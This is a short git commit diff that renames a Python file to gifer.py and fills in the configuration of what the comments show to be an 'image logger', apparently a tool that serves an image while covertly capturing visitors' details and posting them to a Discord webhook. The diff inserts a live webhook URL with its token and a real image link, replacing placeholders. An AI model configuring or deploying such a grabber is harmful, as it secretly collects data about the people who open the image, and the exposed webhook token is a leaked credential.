00952c2538f1d9cd07d3ba915a8289c884f4f7e5
Truzis <paulius.vdu@gmail.com>
2025-10-16 21:59:47 +0300

    Update and rename Pixerrift.py to gifer.py

--- api/gifer.py
+++ api/gifer.py
@@ -12,8 +12,8 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1428452029029814435/KraclAuvej0zCtVkBnkU-8-M1B3X1ubjxb78vi3zZEjE9A2tJSlhmkNyTjMWEQsv0Q3_",
+    "image": "https://c8.alamy.com/comp/AG3WYA/black-mans-bum-AG3WYA.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
